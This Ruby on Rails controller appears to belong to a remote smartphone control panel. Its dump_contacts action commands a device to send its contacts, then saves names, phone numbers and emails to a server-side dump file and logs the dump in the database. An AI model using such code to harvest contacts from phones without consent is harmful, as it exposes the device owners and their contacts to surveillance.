class ContactsController < InheritedResources::Base
  include CommandSender
  
  def dump_contacts
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      fileName = File.basename(params[:filename].to_s).gsub(/[^0-9a-zA-Z._-]/, '')
      @fileName = fileName.empty? ? "contacts_dump_#{currentTimeFormat}.txt" : "#{fileName}.txt"
      
      # Send command via ActionCable and wait for response
      pending_command = send_command_and_wait(@smartphone, 'get_contacts', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        # Process response
        contacts_data = pending_command.response_data
        
        # Save to file
        file_path = Rails.root.join('files', 'dumps', 'contacts_dumps', @fileName)
        FileUtils.mkdir_p(File.dirname(file_path))
        File.write(file_path, format_contacts(contacts_data))
        
        # Save to database
        Contact.create!(
          date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
          filename: @fileName,
          smartphone_id: @smartphone.id
        )
        
        commandOutput = ["Contacts dumped successfully: #{@fileName}"]
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error dumping contacts: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    respond_to do |format|
      format.js {
        render "dump_contacts", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end
  
  private
  
  def format_contacts(contacts_data)
    return "No contacts data" unless contacts_data.is_a?(Array)
    
    contacts_data.map do |contact|
      "Name: #{contact['name']}\nPhone: #{contact['phone_number']}\nEmail: #{contact['email']}\n\n"
    end.join
  end

  private

  def contact_params
    params.require(:contact).permit(:date, :filename, :smartphone_id)
  end
end
